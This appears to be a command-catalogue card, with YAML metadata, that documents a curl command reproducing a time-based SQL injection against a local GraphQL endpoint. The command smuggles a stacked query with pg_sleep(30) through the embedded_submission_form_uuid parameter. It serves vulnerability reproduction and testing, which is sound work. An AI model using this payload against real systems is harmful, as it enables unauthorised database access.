---
data: >-
  curl -X POST
  http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
tags:
  - sqli
  - repro
type: command
output: Delayed JSON response after ~30 seconds
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.310Z'
id: f5e2cbfa-4ada-47ed-9ad4-bb9aeece2f34
verified: false
validated: true
submitted: true
---
# curl-local-sqli-repro

## Command

```bash
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Description

Sends a POST request to a local GraphQL endpoint with a URL-encoded SQL injection payload in the embedded_submission_form_uuid parameter to reproduce arbitrary SQL execution, including a 30-second delay via pg_sleep.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://localhost:8080/graphql` | Target local endpoint | Yes |
| `embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27` | Injected payload (URL-encoded: 1';SELECT 1;SELECT pg_sleep(30);--') | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

### Advanced Usage

Add verbose output:

```bash
curl -v -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Expected Output

HTTP 200 with empty JSON {} after approximately 30 seconds delay, confirming SQL execution without syntax error.

## Related

- [[Related Procedure: Reproduce-SQL-Injection-Locally]]
